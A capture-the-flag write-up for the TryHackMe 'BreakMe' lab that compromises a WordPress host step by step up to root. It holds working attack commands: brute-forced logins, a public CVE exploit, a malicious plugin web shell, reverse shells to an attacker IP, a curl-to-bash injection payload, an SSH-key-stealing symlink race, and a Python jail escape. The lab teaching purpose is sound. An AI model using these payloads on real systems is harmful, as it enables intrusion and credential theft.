---
tags:
  - THM
  - Linux
  - Medium
  - CMS
  - Brute-Force
  - File-Upload
  - RCE
  - Forwarding
  - SUID
  - File-Analysis
  - Race-Condition
  - Sudo
---
https://tryhackme.com/room/breakmenu/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.169.98 breakme.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC breakme.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
By fuzzing, found `/wordpress/` directory.

Then found `wp-data-access` plugin, and **admin** and **bob** as valid users:
```console
$ wpscan --url 'http://breakme.thm/wordpress/' -e p,t,tt,cb,dbe,u,m
...

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2026-01-22T00:02:00.000Z
 | [!] The version is out of date, the latest version is 5.5.65
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt
 
 ...
 
 [i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://breakme.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

 ...
```
**Brute-forced credentials** for known users:
```console
$ wpscan --url 'http://breakme.thm/wordpress/' -U admin,bob -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
...
[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - bob / soccer
...
```
# Exploitation
After login as **bob**, found that it is a normal user, but we can escalate to **admin** by abusing [CVE-2023-1874](https://nvd.nist.gov/vuln/detail/CVE-2023-1874) using the vulnerable version of `wp-data-access` plugin:
```console
$ git clone https://github.com/thomas-osgood/cve-2023-1874

$ cd cve-2023-1874/

$ python3 cve20231874.py -u bob -p soccer --path '/wordpress' breakme.thm 80
============================================================
                     Target Information                     
============================================================
[i] Target IP: breakme.thm
[i] Target Port: 80
[i] Scheme: http
============================================================
[+] cookies set
[+] login success
[+] profile source successfully grabbed
[+] wpnonce: 6a4f2d4389
[+] userid: 2
[+] from: profile
[+] color-nonce: abb1daa278
[+] admin privileges successfully granted to "bob"
[+] exploit completed succesfully
```
Now that we have **admin privileges**, we can generate a **malicious plugin** in ZIP format:
```console
$ git clone https://github.com/MachadoOtto/reversePress

$ cd reversePress/

$ python3 reversePress.py --webshell 192.168.150.216
...
[SUCCESS]: Plugin generated successfully!
[INFO]: Plugin saved as reverse_shell_plugin.zip

[INFO]: Upload the plugin at http://<target_domain>/wp-admin/plugin-install.php?tab=upload
[INFO]: Trigger the reverse shell at https://<target_domain>/wp-content/plugins/reverse_shell_plugin/reverse_shell.php
[INFO]: Trigger the web shell at https://<target_domain>/wp-content/plugins/reverse_shell_plugin/web_shell.php
```
Now, using the UI, we **upload the plugin** and we listen for connections:
```console
$ nc -lvnp 443
```
Finally, we get the **reverse shell connection**:
```console
$ cmd=$(echo -n 'busybox nc 192.168.150.216 443 -e /bin/sh' | urlencode -a)

$ curl -s "http://breakme.thm/wordpress/wp-content/plugins/reverse_shell_plugin/web_shell.php?cmd=$cmd"
```
# Post-Exploitation
## Become john
Found **port 9999** open internally:
```console
$ ss -tulnp

Netid         State          Recv-Q         Send-Q                 Local Address:Port                 Peer Address:Port         Process         
udp           UNCONN         0              0                            0.0.0.0:68                        0.0.0.0:*                            
tcp           LISTEN         0              80                         127.0.0.1:3306                      0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:9999                      0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:22                        0.0.0.0:*                            
tcp           LISTEN         0              511                                *:80                              *:*                            
tcp           LISTEN         0              128                             [::]:22                           [::]:*                            
```
In the local machine, open a [chisel](https://github.com/jpillora/chisel) tunnel:
```console
$ chisel server -p 8001 --reverse
```
Uploaded the linux version of [chisel](https://github.com/jpillora/chisel) to the machine, then connected to the tunnel:
```console
$ ./chisel client 192.168.150.216:8001 R:9999:127.0.0.1:9999 &
```
The web server has 3 user-made tools which seem to **execute commands** in the system. After uploading [pspy](https://github.com/DominicBreuker/pspy) and triggering each tool, found out each functionality:

| Tool         | Parameter | Command (pspy)                              |
| ------------ | --------- | ------------------------------------------- |
| Check Target | IP        | `sh -c ping -c 2 INPUT >/dev/null 2>&1 &`   |
| Check User   | user name | `sh -c id INPUT >/dev/null 2>&1 &`          |
| Check File   | file name | `sh -c find /opt -name "INPUT" 2>/dev/null` |
Also, after some testing, found out that the **Check User** function is the least sanitized one. So, sent some special characters to see response:
```text
~!@#$%^&*()-_+={}][|\`,./?;:'"<>
```
We can see accepted characters (pspy):
```bash
sh -c id ${}|./: >/dev/null 2>&1 &
```
So we listen for connections:
```console
$ echo 'busybox nc 192.168.150.216 4444 -e /bin/sh' > index.html

$ sudo python3 -m http.server 80 &

$ nc -lvnp 4444
```
We concatenate commands by sending this payload and get reverse shell as **john**:
```bash
|curl${IFS}192.168.150.216${IFS}|bash
```
Get the **first flag**:
```console
$ cat /home/john/user1.txt
```
## Become youcef
Found **SUID binary** owned by **youcef** user:
```console
$ find / -perm -4000 2>/dev/null

/home/youcef/readfile
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
```
The binary works like a `cat` command. Using `ghidra`, analyzed its behavior:
```c
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp) {

    int n;
    char buf[1024];
    struct stat lstat_buf;

    if (argc != 2) {
        puts("Usage: ./readfile <FILE>");
        return 1;
    }else if(access(argv[1],F_OK)){
	puts("File Not Found");
	return 1;
    }else if(getuid()!=1002){
	puts("You can't run this program");
	return 1;
    }

    char *flag = strstr(argv[1], "flag");
    char *id_rsa = strstr(argv[1], "id_rsa");
    lstat(argv[1], &lstat_buf);
    int symlink_check = (S_ISLNK(lstat_buf.st_mode));
    int res=access(argv[1],R_OK);
    usleep(0.8);

    if (flag || symlink_check || res==-1 || id_rsa) {
        puts("Nice try!");
        return 1;
    } else {
        puts("I guess you won!\n");
        int fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    }
    
    return 0;
}
```
So, to abuse it, we must provoke a race condition in which we create a regular file, then we overwrite it with a symlink to `/home/youcef/.ssh/id_rsa`:
```console
$ cd /home/john/

$ while true; do touch s; sleep 0.2; ln -sf /home/youcef/.ssh/id_rsa s; sleep 0.2; rm s; done &

$ while true; do /home/youcef/readfile s 2>/dev/null | grep -vE 'Found|guess|^$'; done
```
Now, we crack the private SSH key and connect to the machine:
```console
$ ssh2john id_rsa > id_rsa.hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

$ ssh -i id_rsa youcef@breakme.thm
Enter passphrase for key 'id_rsa':
```
Get the **second flag**:
```console
$ cat /home/youcef/.ssh/user2.txt
```
# Become root
We can execute a restricted Python interpreter as **root**:
```console
$ sudo -l
Matching Defaults entries for youcef on breakme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User youcef may run the following commands on breakme:
    (root) NOPASSWD: /usr/bin/python3 /root/jail.py

$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail  
  Will you stay locked forever  
  Or will you BreakMe  
>> print('abc')
Illegal Input
```
There are many restricted words and functions. Found that the `os` module is already imported:
```console
>> print(globals())

{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f4fa4f46130>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/root/jail.py', '__cached__': None, 'os': <module 'os' from '/usr/lib/python3.9/os.py'>, 'malicious': <function malicious at 0x7f4fa4f9a040>, 'main': <function main at 0x7f4fa4e8a3a0>}
```
Created a malicious file in the system:
```console
$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/a
```
Finally, inside the interpreter and using string manipulation, found a way to execute code:
```python
globals()['so'[::-1]].__dict__['metsys'[::-1]]('/tmp/a')
```
Now, become **root** and get the **root flag**:
```console
$ /bin/bash -p

# cat /root/.root.txt
```